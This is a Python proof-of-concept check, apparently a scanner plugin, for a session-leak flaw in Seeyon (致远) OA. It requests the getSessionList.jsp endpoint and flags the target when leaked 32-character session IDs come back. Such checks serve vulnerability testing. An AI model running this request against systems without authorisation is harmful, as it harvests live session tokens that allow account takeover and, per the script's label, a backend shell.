import requests,re
import urllib

def verify(url):
    relsult = {
        'name': '致远OA Session泄漏漏洞(后台可getshell)',
        'url': url,
        'vulnerable': False,
        'attack': False,
        'about': 'https://www.zhihuifly.com/t/topic/3345, https://www.seebug.org/vuldb/ssvid-93312'
    }
    timeout = 3
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
    }
    payload = '/yyoa/ext/https/getSessionList.jsp?cmd=getAll'
    vurl = urllib.parse.urljoin(url, payload)
    try:
        req = requests.get(vurl, headers=headers, timeout=timeout)
        if req.status_code == 200 and re.search('[0-9A-Z]{32}', req.text):
            relsult['vulnerable'] = True
            relsult['vurl'] = vurl
        return relsult
    except:
        return relsult

